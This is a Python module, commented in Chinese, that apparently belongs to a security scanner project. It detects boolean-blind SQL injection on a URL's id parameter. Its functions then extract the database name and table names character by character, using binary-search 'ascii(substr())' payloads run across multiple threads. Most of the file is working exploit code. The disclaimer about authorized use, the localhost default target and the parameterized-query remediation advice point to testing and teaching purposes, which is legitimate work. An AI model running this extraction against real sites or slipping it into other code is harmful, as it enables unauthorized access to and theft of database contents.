"""
SQL 注入布尔盲注扫描器与数据库爆破工具
========================================

检测基于布尔的 SQL 注入漏洞，确认漏洞后利用二分查找逐位猜解
数据库名和表名，并支持多线程并行爆破表名。

独立运行：
    python -m src.scanners.sqli_scanner

库调用：
    from src.scanners.sqli_scanner import scan
    result = scan("http://127.0.0.1:5000/sqli/index.php")

工作流程：
    阶段一 — 漏洞探测：发送真/假条件 Payload 对比响应长度
    阶段二 — 数据爆破：二分查找猜解数据库名与表名（多线程并行）

注意：本工具仅用于授权的安全测试和教育目的。
"""

import logging
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Dict, List, Optional

from config import (
    SCANNER_TIMEOUT,
    SQLI_MAX_DB_LENGTH,
    SQLI_MAX_TABLE_COUNT,
    SQLI_MAX_THREADS,
)

logger = logging.getLogger(__name__)

# ── 默认配置 ──────────────────────────────────────────────────────────
DEFAULT_CONFIG = {
    "timeout": SCANNER_TIMEOUT,
    "max_db_length": SQLI_MAX_DB_LENGTH,
    "max_table_count": SQLI_MAX_TABLE_COUNT,
    "max_threads": SQLI_MAX_THREADS,
    "boolean_payloads": ["' and 1=1 -- ", "' and 1=2 -- "],
}

# ── 风险闭环：修复建议知识库 ─────────────────────────────────────────
REMEDIATION_DB = {
    "title": "使用参数化查询（Parameterized Queries）",
    "description": (
        "使用 f-string 或字符串拼接构造 SQL 语句会导致 SQL 注入漏洞，"
        "攻击者可注入恶意代码获取、篡改或删除数据库数据。"
    ),
    "suggestion": (
        "请使用数据库驱动提供的参数占位符（如 PyMySQL 的 %s）"
        "来传递用户输入，从根本上杜绝 SQL 注入。"
    ),
    "code_example": (
        "# ❌ 危险写法\n"
        'query = f"SELECT * FROM users WHERE id = \'{user_id}\'"\n\n'
        "# ✅ 安全写法\n"
        'cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))'
    ),
}

# ── 缓存：避免 _check_boolean_condition 重复请求参考 URL ─────────────
_REF_CACHE = {}


def _get_reference_len(target_url: str, config: Dict) -> Optional[int]:
    """获取真值条件（1=1）响应的 body 长度，并缓存以复用"""
    cache_key = f"{target_url}:ref"
    if cache_key not in _REF_CACHE:
        try:
            url = f"{target_url}?id=1{config['boolean_payloads'][0]}"
            resp = requests.get(url, timeout=config["timeout"])
            _REF_CACHE[cache_key] = len(resp.text)
        except Exception:
            return None
    return _REF_CACHE[cache_key]


# ── 公开接口 ──────────────────────────────────────────────────────────

def scan(target_url: str, db_config: Optional[Dict] = None, **kwargs) -> Dict:
    """对目标 URL 执行完整的 SQL 注入扫描

    Args:
        target_url: 目标 URL（如 http://127.0.0.1:5000/sqli/index.php）
        db_config: 可选数据库配置（当前版本暂未使用）
        **kwargs: 覆盖默认配置项

    Returns:
        Dict: 包含 vulnerable、severity、details、extracted_data、remediation
    """
    config = DEFAULT_CONFIG.copy()
    config.update(kwargs)

    result: Dict = {
        "vulnerable": False,
        "severity": "NONE",
        "details": [],
        "extracted_data": {"database": "", "tables": []},
        "remediation": None,
    }

    try:
        # 阶段一：漏洞探测
        if not _is_vulnerable(target_url, config):
            result["details"].append("未检测到 SQL 注入漏洞")
            return result

        result["vulnerable"] = True
        result["severity"] = "CRITICAL"
        result["details"].append("[+] 发现布尔盲注 SQL 注入漏洞")
        result["remediation"] = REMEDIATION_DB

        # 阶段二：数据爆破
        extracted = _perform_exploitation(target_url, config)
        result["extracted_data"] = extracted

        if extracted["database"]:
            result["details"].append(f"[+] 数据库名: {extracted['database']}")
        if extracted["tables"]:
            result["details"].append(
                f"[+] 获取到 {len(extracted['tables'])} 个表名"
            )
            for t in extracted["tables"]:
                result["details"].append(f"    - {t}")

    except Exception as exc:
        logger.exception("SQLi 扫描出错")
        result["details"].append(f"[-] 扫描错误: {exc}")

    return result


# ── 内部实现 ──────────────────────────────────────────────────────────

def _is_vulnerable(target_url: str, config: Dict) -> bool:
    """检查目标是否存在布尔盲注漏洞"""
    try:
        url_true = f"{target_url}?id=1{config['boolean_payloads'][0]}"
        url_false = f"{target_url}?id=1{config['boolean_payloads'][1]}"

        resp_true = requests.get(url_true, timeout=config["timeout"])
        resp_false = requests.get(url_false, timeout=config["timeout"])

        # 方式一：响应长度不同
        if len(resp_true.text) != len(resp_false.text):
            return True
        # 方式二：内容关键词不同
        if "用户信息" in resp_true.text and "未找到" in resp_false.text:
            return True
    except Exception:
        pass
    return False


def _check_boolean_condition(target_url: str, payload_suffix: str,
                             config: Dict) -> bool:
    """判断 Payload 是否为真值条件（复用缓存的参考长度）"""
    try:
        url = f"{target_url}?id=1{payload_suffix}"
        resp = requests.get(url, timeout=config["timeout"])
        ref_len = _get_reference_len(target_url, config)
        if ref_len is None:
            return False
        return len(resp.text) == ref_len
    except Exception:
        return False


def _get_length(target_url: str, expr: str, config: Dict) -> int:
    """通过二分查找获取数据长度"""
    low, high = 1, config["max_db_length"]
    length = -1

    # 先确认数据非空
    if not _check_boolean_condition(
        target_url, f"' and length(({expr}))>0 -- ", config
    ):
        return 0

    while low <= high:
        mid = (low + high) // 2
        if _check_boolean_condition(
            target_url, f"' and length(({expr}))>={mid} -- ", config
        ):
            length = mid
            low = mid + 1
        else:
            high = mid - 1
    return length


def _guess_char_binary_search(target_url: str, expr: str,
                              position: int, config: Dict) -> str:
    """使用二分查找法猜解指定位置的单个字符（ASCII 32~126）"""
    low, high = 32, 126
    char_val = -1
    while low <= high:
        mid = (low + high) // 2
        if _check_boolean_condition(
            target_url,
            f"' and ascii(substr(({expr}),{position},1))>={mid} -- ",
            config,
        ):
            char_val = mid
            low = mid + 1
        else:
            high = mid - 1
    return chr(char_val) if char_val != -1 else ""


def _dump_data(target_url: str, expr: str, config: Dict) -> str:
    """逐位猜解完整数据内容"""
    data_len = _get_length(target_url, expr, config)
    if data_len <= 0:
        return ""
    result = ""
    for i in range(1, data_len + 1):
        ch = _guess_char_binary_search(target_url, expr, i, config)
        if not ch:
            break
        result += ch
    return result


def _dump_single_table(args):
    """线程池辅助函数：爆破单个表名"""
    target_url, db_name, index, config = args
    expr = (
        f"select table_name from information_schema.tables "
        f"where table_schema='{db_name}' limit {index},1"
    )
    return index, _dump_data(target_url, expr, config)


def _dump_all_tables(target_url: str, db_name: str,
                     config: Dict) -> List[str]:
    """多线程并行爆破获取所有表名"""
    tasks = [(target_url, db_name, i, config)
             for i in range(config["max_table_count"])]
    tables_map = {}

    with ThreadPoolExecutor(max_workers=config["max_threads"]) as executor:
        futures = {executor.submit(_dump_single_table, t): t[2] for t in tasks}
        for future in as_completed(futures):
            try:
                idx, name = future.result()
                if name:
                    tables_map[idx] = name
            except Exception:
                continue

    tables = []
    for i in range(config["max_table_count"]):
        if i in tables_map:
            tables.append(tables_map[i])
        else:
            break
    return tables


def _perform_exploitation(target_url: str, config: Dict) -> Dict:
    """执行数据爆破流程"""
    extracted = {"database": "", "tables": []}
    try:
        db_name = _dump_data(target_url, "database()", config)
        if db_name:
            extracted["database"] = db_name
            extracted["tables"] = _dump_all_tables(target_url, db_name, config)
    except Exception:
        logger.exception("SQLi 数据爆破失败")
    return extracted


# ── 独立测试入口 ──────────────────────────────────────────────────────
if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO, format="%(message)s")
    test_url = "http://127.0.0.1:5000/sqli/index.php"
    print(f"[*] 开始扫描 {test_url} ...")
    r = scan(test_url)
    print(f"  存在漏洞: {r['vulnerable']}")
    print(f"  严重等级: {r['severity']}")
    for d in r["details"]:
        print(f"  {d}")
